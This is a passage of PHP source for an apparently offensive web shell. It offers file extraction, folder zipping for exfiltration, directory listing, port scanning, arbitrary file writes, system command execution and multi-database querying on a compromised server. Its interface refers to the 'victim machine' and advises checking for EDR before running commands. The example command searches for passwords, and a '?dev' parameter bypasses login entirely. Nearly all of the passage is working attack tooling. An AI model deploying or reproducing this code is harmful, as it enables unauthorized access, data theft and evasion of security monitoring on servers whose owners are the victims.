            $sub_path = "$dir/$file";

            if (
                is_file($sub_path) &&
                ($extensions === [] || in_array(strtolower(pathinfo($sub_path, PATHINFO_EXTENSION)), $extensions))
            ) {
                $zip->addFile(
                    $sub_path,
                    str_replace(
                        $cleanup_path,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($sub_path),
                        ),  // Replace backslashes with forward slashes
                    ), // Remove common path from filename
                ); // Add with relative path within zip
            }
            else {
                if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
                    addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
                }
            }
        }
    }

    closedir($dir_handle);
}

/**
 * Handle the port scan operation
 *
 * @return void
 */
function handlePortScan() {
    $host      = $_POST['__PARAM_1__'];
    $startPort = intval($_POST['__PARAM_2__']);
    $endPort   = intval($_POST['__PARAM_3__']);

    out("Scanning ports $startPort to $endPort on $host...");

    // Loop through the port range
    for ($port = $startPort; $port <= $endPort; $port++) {
        // Attempt to connect to the host on the current port
        $socket = @fsockopen($host, $port, $errno, $errstr, 1);

        // Check if the connection was successful
        if ($socket) {
            // The port is open
            fclose($socket);
            out("Port $port: OPEN");
        }
        else {
            // The port is closed or unreachable
            out("Port $port: CLOSED / UNREACHABLE (err: $errstr)");
        }
        flush();
    }
}

/**
 * Handle the write file operation
 *
 * @return void
 */
function handleWriteFile() {
    $filename               = $_POST['__PARAM_1__'];
    $should_decode_from_b64 = isCheckboxActive("__PARAM_3__");
    $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];

    out(
        ["Received content of length " . strlen($content) . " bytes.", "Writing to $filename ..."],
    );

    file_put_contents($filename, $content);
    out("File written successfully.");
}

/**
 * Handle the login operation
 *
 * @return void
 */
function handleLogin() {
    global $SALT, $PASSWORD, $USERNAME, $FILE_EXTRACTION;
    $username = hash("sha512", $_POST["__PARAM_1__"] . $SALT);
    $password = hash("sha512", $_POST["__PARAM_2__"] . $SALT);

    if ($username === $USERNAME && $password === $PASSWORD) {
        $_SESSION["auth"] = true;
        header("Location: ?page=" . $FILE_EXTRACTION, true, 301);
    }
}

/**
 * Render the page for the exfiltration operation
 *
 * @return string
 */
function makeExfiltratePage() {
    global $EXFILTRATE, $ENABLED_FEATURES;
    return makePage(
        [
            makePageHeader(
                $ENABLED_FEATURES[$EXFILTRATE]["title"],
                $ENABLED_FEATURES[$EXFILTRATE]["description"],
            ),
            makeForm(
                $EXFILTRATE,
                $_SERVER["REQUEST_URI"],
                [
                    makeInput(
                        "textarea",
                        "Paths",
                        "__PARAM_1__",
                        "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
                        "List of file/folders to include in the zip archive.<br/>" .
                        "Concatenate to the path " . makeCodeHighlight(",with_tree") .
                        " to include all files and folders within a given directory.<br/>" .
                        "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
                        " to include only files with the given extensions.",
                        true,
                    ),
                ],
            ),
        ],
        $EXFILTRATE,
    );
}

/**
 * List all enabled extensions
 *
 * @return string
 */
function listEnabledExtensions() {
    $extensions = get_loaded_extensions();
    ob_start();
    openCommandOutputScreen("max-h-96 overflow-y-scroll mb-8", "Enabled extensions", true, true);
    foreach ($extensions as $extension) {
        echo "- $extension\n";
    }
    closeCommandOutputScreen();
    return ob_get_clean();
}

/**
 * Run a PDO query and output the results
 *
 * @param $pdo PDO PDO connection to use
 * @param $query string Query to run
 *
 * @return void
 */
function runPDOQuery($pdo, $query) {
    $stmt = $pdo->query($query);
    if ($stmt) {
        $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if ($result) {
            echo "[Driver: PDO] Query executed successfully.\n";
            printAsciiTable($result);
        }
        else {
            echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
        }
    }
    else {
        echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
    }
}

/**
 * Print an ASCII table from the given data
 *
 * @param $data
 *
 * @return void
 */
function printAsciiTable($data) {
    // Get column headers
    $headers = array_keys($data[0]);

    // Calculate column widths
    $columnWidths = [];
    foreach ($headers as $header) {
        $columnWidths[$header] = max(array_map('strlen', array_column($data, $header))) + 2;
    }

    // Print top row
    echo "+";
    foreach ($headers as $header) {
        echo str_repeat("-", $columnWidths[$header]);
        echo "+";
    }
    echo PHP_EOL;

    // Print header row
    echo "|";
    foreach ($headers as $header) {
        printf("%-{$columnWidths[$header]}s|", $header);
    }
    echo PHP_EOL;

    // Print divider row
    echo "+";
    foreach ($headers as $header) {
        echo str_repeat("-", $columnWidths[$header]);
        echo "+";
    }
    echo PHP_EOL;

    // Print table rows
    foreach ($data as $row) {
        echo "|";
        foreach ($row as $key => $value) {
            printf("%-{$columnWidths[$key]}s|", $value);
        }
        echo PHP_EOL;
    }

    // Print bottom row
    echo "+";
    foreach ($headers as $header) {
        echo str_repeat("-", $columnWidths[$header]);
        echo "+";
    }
    echo PHP_EOL;
}

/**
 * Connect to a database using the given credentials and return the connection
 *
 * @param $db_type string Database type
 * @param $username string Username to connect with
 * @param $password string Password to connect with
 * @param $host string Host to connect to
 * @param $port int Port to connect to
 * @param $service_name string Service name to use for connection
 * @param $sid string SID to use for connection
 * @param $database string Database to connect to
 * @param $charset string Charset to use for connection
 * @param $options string Options to use for connection
 * @param $role string Role to use for connection
 * @param $dialect string Dialect to use for connection
 * @param $odbc_driver string ODBC driver to use for connection
 * @param $server string Informix server name
 * @param $protocol string Protocol to use for connection
 * @param $enableScrollableCursors string Whether to enable scrollable cursors
 * @param $raw_connection_string string Raw connection string to use for connection
 *
 * @return void
 */
function connectAndQueryDatabase(
    $db_type,
    $username,
    $password,
    $host = 'localhost',
    $port = null,
    $service_name = null,
    $sid = null,
    $database = null,
    $charset = null,
    $options = null,
    $role = null,
    $dialect = null,
    $odbc_driver = null,
    $server = null,
    $protocol = "onsoctcp",
    $enableScrollableCursors = null,
    $raw_connection_string = "",
    $query = null,
    $collection = null,
) {
    if ($db_type === 'mysql') {
        $port = $port ?: 3306;

        // Check if the MySQL extension is loaded
        if (extension_loaded("mysqli")) {
            mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
            try {
                $connection = mysqli_connect($host, $username, $password, $database, $port);

                if (!$connection) {
                    echo "[Driver: mysqli] Connection failed: " . mysqli_connect_error();
                }
                else {
                    echo "[Driver: mysqli] Connected successfully using $username:$password.\n";

                    if (!empty($query)) {
                        $result = mysqli_query($connection, $query);
                        if ($result) {
                            echo "[Driver: mysqli] Query executed successfully.\n";
                            $rows = [];
                            while ($row = mysqli_fetch_assoc($result)) {
                                $rows[] = $row;
                            }
                            printAsciiTable($rows);
                        }
                        else {
                            echo "[Driver: mysql] Query failed: " . mysqli_error($connection);
                        }
                    }
                }
            }
            catch (mysqli_sql_exception $e) {
                echo "[Driver: mysqli] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the PDO MySQL extension is loaded
        elseif (extension_loaded("pdo_mysql")) {
            try {
                $dsn = "mysql:host=$host;port=$port" .
                       (!empty($database) ? ";dbname=$database" : "") .
                       (!empty($charset) ? ";charset=$charset" : "");

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_mysql] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_mysql] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
        elseif (extension_loaded("pdo")) {
            echo "[Driver: PDO] PDO extension is loaded but PDO MySQL driver is not installed.\n";
        }
        else {
            echo "[Driver: none] MySQL extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'cubrid') {
        $port = $port ?: 30000;

        // Check if the CUBRID PDO extension is loaded
        if (extension_loaded("pdo_cubrid")) {
            try {
                $dsn = "cubrid:host=$host;port=$port" .
                       (!empty($database) ? ";dbname=$database" : "") .
                       (!empty($charset) ? ";charset=$charset" : "");

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_cubrid] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_cubrid] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the CUBRID extension is loaded
        elseif (extension_loaded("cubrid")) {
            $connection = cubrid_connect($host, $port, $database, $username, $password);

            if (!$connection) {
                echo "[Driver: cubrid] Connection failed: " . cubrid_error_msg();
            }
            else {
                echo "[Driver: cubrid] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    $result = cubrid_query($query, $connection);
                    if ($result) {
                        echo "[Driver: cubrid] Query executed successfully.\n";
                        $rows = [];
                        while ($row = cubrid_fetch_assoc($result)) {
                            $rows[] = $row;
                        }
                        printAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: cubrid] Query failed: " . cubrid_error($connection);
                    }
                }
            }
        }
        else {
            echo "[Driver: none] CUBRID extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'pgsql') {
        $port = $port ?: 5432;

        // Check if the PostgreSQL PDO extension is loaded
        if (extension_loaded("pdo_pgsql")) {
            try {
                $dsn = "pgsql:host=$host;port=$port" . (!empty($database) ? ";dbname=$database" : "");

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_pgsql] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_pgsql] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the PostgreSQL extension is loaded
        elseif (extension_loaded("pgsql")) {
            $connection = pg_connect("host=$host port=$port dbname=$database user=$username password=$password");

            if (!$connection) {
                echo "[Driver: pgsql] Connection failed: " . pg_last_error();
            }
            else {
                echo "[Driver: pgsql] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    $result = pg_query($connection, $query);
                    if ($result) {
                        echo "[Driver: pgsql] Query executed successfully.\n";
                        $rows = [];
                        while ($row = pg_fetch_assoc($result)) {
                            $rows[] = $row;
                        }
                        printAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: pgsql] Query failed: " . pg_last_error($connection);
                    }
                }
            }
        }
        else {
            echo "[Driver: none] PostgreSQL extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'sqlite') {
        // Check if the SQLite PDO extension is loaded
        if (extension_loaded("pdo_sqlite")) {
            try {
                $dsn = "sqlite:$host";

                $pdo = new PDO($dsn);
                echo "[Driver: pdo_sqlite] Connected successfully using $host.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_sqlite] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the SQLite extension is loaded
        elseif (extension_loaded("sqlite3")) {
            $connection = sqlite_open($host, 0666, $error);

            if (!$connection) {
                echo "[Driver: sqlite3] Connection failed: $error";
            }
            else {
                echo "[Driver: sqlite3] Connected successfully using $host.\n";

                if (!empty($query)) {
                    $result = sqlite_query($connection, $query);
                    if ($result) {
                        echo "[Driver: sqlite3] Query executed successfully.\n";
                        $rows = [];
                        while ($row = sqlite_fetch_array($result)) {
                            $rows[] = $row;
                        }
                        printAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: sqlite3] Query failed: " . sqlite_error_string(sqlite_last_error($connection));
                    }
                }
            }
        }
        else {
            echo "[Driver: none] SQLite extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'sqlsrv') {
        $port = $port ?: 1433;

        // Check if the SQL Server PDO extension is loaded
        if (extension_loaded("pdo_sqlsrv")) {
            try {
                $dsn = "sqlsrv:Server=$host,$port" . (!empty($database) ? ";Database=$database" : "");

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_sqlsrv] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_sqlsrv] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the SQL Server extension is loaded
        elseif (extension_loaded("sqlsrv")) {
            echo "Connecting to $host with default instance specification ...\n";
            $connection = sqlsrv_connect($host, ["Database" => $database, "UID" => $username, "PWD" => $password]);

            if (!$connection) {
                echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
                echo "[Driver: sqlsrv] Trying to connect to $host,$port ...\n";

                $connection = sqlsrv_connect(
                    "$host,$port",
                    ["Database" => $database, "UID" => $username, "PWD" => $password],
                );

                if (!$connection) {
                    echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
                }
                else {
                    echo "[Driver: sqlsrv] Connected successfully using $username:$password (host,port).\n";
                }
            }
            else {
                echo "[Driver: sqlsrv] Connected successfully using $username:$password (host only).\n";
            }

            if (!empty($query) && $connection) {
                $result = sqlsrv_query($connection, $query);
                if ($result) {
                    echo "[Driver: sqlsrv] Query executed successfully.\n";
                    $rows = [];
                    while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
                        $rows[] = $row;
                    }
                    printAsciiTable($rows);
                }
                else {
                    echo "[Driver: sqlsrv] Query failed: " . sqlsrv_errors();
                }
            }
        }
        else {
            echo "[Driver: none] SQL Server extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'oci') {
        $port = $port ?: 1521;

        // Check if the Oracle PDO extension is loaded
        if (extension_loaded("pdo_oci")) {
            try {
                if (!empty($sid)) {
                    $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SID = $sid)))";
                }
                else {
                    $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SERVICE_NAME = $service_name)))";
                }
                $dsn = "oci:dbname=$tns";

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_oci] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_oci] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the Oracle extension is loaded
        elseif (extension_loaded("oci8")) {
            $connection = oci_connect($username, $password, "$host:$port/$service_name");

            if (!$connection) {
                echo "[Driver: oci8] Connection failed: " . oci_error();
            }
            else {
                echo "[Driver: oci8] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    $statement = oci_parse($connection, $query);
                    if ($statement) {
                        if (oci_execute($statement)) {
                            echo "[Driver: oci8] Query executed successfully.\n";
                            $rows = [];
                            while ($row = oci_fetch_assoc($statement)) {
                                $rows[] = $row;
                            }
                            printAsciiTable($rows);
                        }
                        else {
                            echo "[Driver: oci8] Query failed: " . oci_error($statement);
                        }
                    }
                    else {
                        echo "[Driver: oci8] Query failed: " . oci_error($connection);
                    }
                }
            }
        }
        else {
            echo "[Driver: none] Oracle extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'mongodb') {
        $port = $port ?: 27017;
        $dsn  = "mongodb://$username:$password@$host:$port/$database";

        // Check if the MongoDB extension is loaded
        if (extension_loaded("mongodb")) {
            try {
                $connection = new MongoDB\Driver\Manager($dsn, explode("&", $options));
                echo "[Driver: mongodb] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    $query  = new MongoDB\Driver\Query([]);
                    $cursor = $connection->executeQuery("$database.$collection", $query);

                    $rows = [];
                    foreach ($cursor as $row) {
                        $rows[] = $row;
                    }
                    printAsciiTable($rows);
                }
            }
            catch (MongoDB\Driver\Exception\Exception $e) {
                echo "[Driver: mongodb] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the Mongo extension is loaded
        elseif (extension_loaded("mongo")) {
            try {
                $connection = new Mongo($dsn, array_merge(["connect" => true], explode("&", $options)));
                echo "[Driver: mongo] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    $collection = $connection->selectCollection($database, $collection);
                    $cursor     = $collection->find();

                    $rows = [];
                    foreach ($cursor as $row) {
                        $rows[] = $row;
                    }
                    printAsciiTable($rows);
                }
            }
            catch (MongoConnectionException $e) {
                echo "[Driver: mongo] Connection failed: " . $e->getMessage();
            }
            catch (Exception $e) {
                echo "[Driver: mongo] Connection failed: " . $e->getMessage();
            }
        }
        else {
            echo "[Driver: none] MongoDB extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'ibm') {
        $port = $port ?: 50000;
        $dsn  = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$database;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;UID=$username;PWD=$password;";

        // Check if the IBM PDO extension is loaded
        if (extension_loaded("pdo_ibm")) {
            try {
                $pdo = new PDO($dsn);
                echo "[Driver: pdo_ibm] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_ibm] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the IBM extension is loaded
        elseif (extension_loaded("ibm")) {
            $connection = db2_connect($dsn, $username, $password);

            if (!$connection) {
                echo "[Driver: ibm] Connection failed: " . db2_conn_error();
            }
            else {
                echo "[Driver: ibm] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    $result = db2_exec($connection, $query);
                    if ($result) {
                        echo "[Driver: ibm] Query executed successfully.\n";
                        $rows = [];
                        while ($row = db2_fetch_assoc($result)) {
                            $rows[] = $row;
                        }
                        printAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: ibm] Query failed: " . db2_conn_error();
                    }
                }
            }
        }
        else {
            echo "[Driver: none] IBM extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'firebird') {
        $port = $port ?: 3050;
        $dsn  = "firebird:dbname=$host/$port:$database" .
                (!empty($charset) ? ";charset=$charset" : "") .
                (!empty($role) ? ";role=$role" : "") .
                (!empty($dialect) ? ";dialect=$dialect" : "");

        // Check if the Firebird PDO extension is loaded
        if (extension_loaded("pdo_firebird")) {
            try {
                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_firebird] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_firebird] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the Firebird extension is loaded
        elseif (extension_loaded("interbase")) {
            echo "Connecting to $host/$port:$database (TCP/IP on custom port) ...\n";
            $connection = ibase_connect($host . "/" . $port . ":" . $database, $username, $password);

            if (!$connection) {
                echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
                echo "[Driver: interbase] Trying to connect to $host:$database (TCP/IP implicit port) ...\n";

                $connection = ibase_connect($host . ":" . $database, $username, $password);

                if (!$connection) {
                    echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
                    echo "[Driver: interbase] Trying to connect to //$host/$database (NetBEUI) ...\n";

                    $connection = ibase_connect("//" . $host . "/" . $database, $username, $password);

                    if (!$connection) {
                        echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
                    }
                    else {
                        echo "[Driver: interbase] Connected successfully using $username:$password (//host/database aka NetBEUI).\n";
                    }
                }
                else {
                    echo "[Driver: interbase] Connected successfully using $username:$password (host:database).\n";
                }
            }
            else {
                echo "[Driver: interbase] Connected successfully using $username:$password (host/port:database).\n";
            }

            if (!empty($query) && $connection) {
                $result = ibase_query($connection, $query);
                if ($result) {
                    echo "[Driver: interbase] Query executed successfully.\n";
                    $rows = [];
                    while ($row = ibase_fetch_assoc($result)) {
                        $rows[] = $row;
                    }
                    printAsciiTable($rows);
                }
                else {
                    echo "[Driver: interbase] Query failed: " . ibase_errmsg();
                }
            }
        }
        else {
            echo "[Driver: none] Firebird extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'odbc') {
        $dsn = "odbc:Driver=$odbc_driver;Server=$host,$port;Database=$database;Uid=$username;Pwd=$password;";

        // Check if the ODBC PDO extension is loaded
        if (extension_loaded("pdo_odbc")) {
            try {
                $pdo = new PDO($dsn);
                echo "[Driver: pdo_odbc] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_odbc] Connection failed: " . $e->getMessage();
            }
        }
        // Check if the ODBC extension is loaded
        elseif (extension_loaded("odbc")) {
            $connection = odbc_connect($dsn, $username, $password);

            if (!$connection) {
                echo "[Driver: odbc] Connection failed: " . odbc_errormsg();
            }
            else {
                echo "[Driver: odbc] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    $result = odbc_exec($connection, $query);
                    if ($result) {
                        echo "[Driver: odbc] Query executed successfully.\n";
                        $rows = [];
                        while ($row = odbc_fetch_array($result)) {
                            $rows[] = $row;
                        }
                        printAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: odbc] Query failed: " . odbc_errormsg();
                    }
                }
            }
        }
        else {
            echo "[Driver: none] ODBC extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'informix') {
        $port = $port ?: 9800;
        $dsn  = "informix:host=$host;service=$port;database=$database;server=$server;protocol=$protocol;EnableScrollableCursors=$enableScrollableCursors";

        // Check if the Informix PDO extension is loaded
        if (extension_loaded("pdo_informix")) {
            try {
                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_informix] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_informix] Connection failed: " . $e->getMessage();
            }
        }
        else {
            echo "[Driver: none] Informix extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'sybase') {
        $port = $port ?: 5000;
        $dsn  = "sybase:host=$host:$port" . (!empty($database) ? ";dbname=$database" : "");

        // Check if the Sybase PDO extension is loaded
        if (extension_loaded("pdo_dblib")) {
            try {
                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_dblib] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_dblib] Connection failed: " . $e->getMessage();
            }
        }
        else {
            echo "[Driver: none] Sybase extension is not loaded.\n";
        }
    }
    elseif ($db_type === 'raw') {
        $dsn = $raw_connection_string;

        // Check if the PDO extension is loaded
        if (extension_loaded("pdo")) {
            try {
                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: PDO] Connected successfully using $username:$password.\n";

                if (!empty($query)) {
                    runPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: PDO] Connection failed: " . $e->getMessage();
            }
        }
        else {
            echo "[Driver: PDO] PDO extension is not loaded.\n";
        }
    }
    else {
        echo "[Driver: none] Unsupported database type: $db_type";
    }
}

// TEMPLATE DEVELOPMENT BACKDOOR - START
// The following snippet is a backdoor that allows for template development without the need to authenticate.
// This should be removed before deploying the template to a production environment.
if (isset($_GET["dev"])) {
    $_SESSION["auth"] = true;
}
// TEMPLATE DEVELOPMENT BACKDOOR - END

// Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
// on the page except the operation result.
$isolated_ops = [$FILE_EXTRACTION, $EXFILTRATE, $LOGIN];

// Check if the request is not POST and the operation is not in the isolated operations list, then render the page
if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
    $page = $_GET['page'] ?? ($_SESSION["auth"] === true ? $FILE_EXTRACTION : $LOGIN);

    $content = "";

    switch ($page) {
        case $LOGIN:
            $content = makeLoginPage();
            break;
        case $FILE_EXTRACTION_PREVIEW:
        case $FILE_EXTRACTION:
            $content = makePage(
                [
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"],
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        [
                            makeInput(
                                "text",
                                "Path",
                                "__PARAM_1__",
                                "C://path/to/file.txt",
                                "Fully qualified path to the file to extract.",
                                true,
                                "__PARAM_99__",
                            ),
                            makeCheckbox(
                                "__PARAM_2__",
                                "Preview",
                                "Display preview of the file content if it's larger than 100kb.",
                                $page === $FILE_EXTRACTION_PREVIEW,
                                "y",
                                $page === $FILE_EXTRACTION_PREVIEW
                                    ? "window.location.href = '?page=" .
                                      $FILE_EXTRACTION .
                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                                    : "window.location.href = '?page=" .
                                      $FILE_EXTRACTION_PREVIEW .
                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value",
                            ),
                            makeCheckbox(
                                "__PARAM_3__",
                                "Export",
                                "Export the file even if larger than 100kb.",
                            ),
                        ],
                    ),
                ],
                $page,
            );
            break;
        case $DIRECTORY_LISTING:
            $content = makePage(
                [
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"],
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        [
                            makeInput(
                                "text",
                                "Path",
                                "__PARAM_1__",
                                "C://path/to/directory or \\\\network\\path\\to\\directory",
                                "Fully qualified path to the directory to list.",
                                true,
                            ),
                            makeInput(
                                "text",
                                "Depth",
                                "__PARAM_2__",
                                "5",
                                "How many levels deep to list, where " . makeCodeHighlight(0) .
                                " is the current directory and " . makeCodeHighlight("inf") .
                                " means to list all.",
                                true,
                            ),
                        ],
                    ),
                ],
                $page,
            );
            break;
        case $EXFILTRATE:
            $content = makeExfiltratePage();
            break;
        case $PORT_SCAN:
            $content = makePage(
                [
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"],
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        [
                            makeInput(
                                "text",
                                "Host",
                                "__PARAM_1__",
                                "localhost",
                                "The host to connect to",
                                true,
                            ),
                            makeInput(
                                "number",
                                "Starting port",
                                "__PARAM_2__",
                                "1",
                                "Starting port of the scan (included)",
                                true,
                            ),
                            makeInput(
                                "number",
                                "Ending port",
                                "__PARAM_3__",
                                "65535",
                                "Ending port of the scan (included)",
                                true,
                            ),
                        ],
                    ),
                ],
                $page,
            );
            break;
        case $WRITE_FILE:
            $content = makePage(
                [
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"],
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        [
                            makeInput(
                                "text",
                                "Path",
                                "__PARAM_1__",
                                "C://path/to/file.txt",
                                "Fully qualified path where the file will be written.",
                                true,
                            ),
                            makeInput(
                                "textarea",
                                "File content",
                                "__PARAM_2__",
                                "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
                                "Content of the file to write to disk.",
                                true,
                            ),
                            makeCheckbox(
                                "__PARAM_3__",
                                "Decode from base64",
                                "Decode the content of the file from base64 before writing it to disk.",
                            ),
                        ],
                    ),
                ],
                $page,
            );
            break;
        case $RUN_COMMAND:
            $content = makePage(
                [
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"],
                    ),
                    makeAlert(
                        "Running system commands",
                        "Running system commands results in the creation of a child process from the 
                        webserver/php process (aka a new terminal is spawned), this behaviour as you may expect can be 
                        easily detected by EDR and other security solutions.
                        <br/>
                        If triggering alert is not a problem, safely ignore this alert, otherwise carefully examine the 
                        victim machine and ensure that there is no security solution running before using this module.",
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        [
                            makeInput(
                                "textarea",
                                "Command",
                                "__PARAM_1__",
                                "ls -lah | grep pass",
                                "Command to run through the default system shell. This can be used to establish a full duplex tunnel between the attacker and the victim machine.",
                                true,
                            ),
                        ],
                    ),
                ],
                $page,
            );
            break;
        case $PHP_INFO:
            ob_start();
            phpinfo();
            $php_info = ob_get_clean();
            $content  = makePage(
                [
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"],
                    ),
                    "<div class='grid grid-cols-2 gap-8 mt-8'>
                        <div>
                            <div id='phpinfo-container' class='max-w-full overflow-x-auto'></div>
                            <script>
                                const container = document.getElementById('phpinfo-container');
                                const shadow_root = container.attachShadow({mode: 'open'});
                                shadow_root.innerHTML = `$php_info`;
                            </script>
                        </div>
                        <div>
                            " . listEnabledExtensions() . "
                        </div>
                    </div>",
                ],
                $page,
            );
            break;
        case $QUERY_DATABASES:
            $content = makePage(
                [
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"],
                    ),
                    makeForm(
                        $page,
                        $_SERVER["REQUEST_URI"],
                        [
                            makeSelect(
                                "Database",
                                "__PARAM_1__",
                                [
                                    [
                                        "value"    => "mysql",
                                        "label"    => "MySQL",
                                        "disabled" => !extension_loaded("mysql") &&
                                                      !extension_loaded("mysqli") &&
                                                      !extension_loaded("pdo_mysql"),
                                    ],
                                    [
                                        "value"    => "cubrid",
                                        "label"    => "CUBRID",
                                        "disabled" => !extension_loaded("cubrid") && !extension_loaded("pdo_cubrid"),
                                    ],
                                    [
                                        "value"    => "pgsql",
                                        "label"    => "PostgreSQL",
                                        "disabled" => !extension_loaded("pgsql") && !extension_loaded("pdo_pgsql"),
                                    ],
                                    [
                                        "value"    => "sqlite",
                                        "label"    => "SQLite",
                                        "disabled" => !extension_loaded("sqlite3") && !extension_loaded("pdo_sqlite"),
                                    ],
                                    [
                                        "value"    => "sqlsrv",
                                        "label"    => "SQL Server",
                                        "disabled" => !extension_loaded("sqlsrv") && !extension_loaded("pdo_sqlsrv"),
                                    ],
                                    [
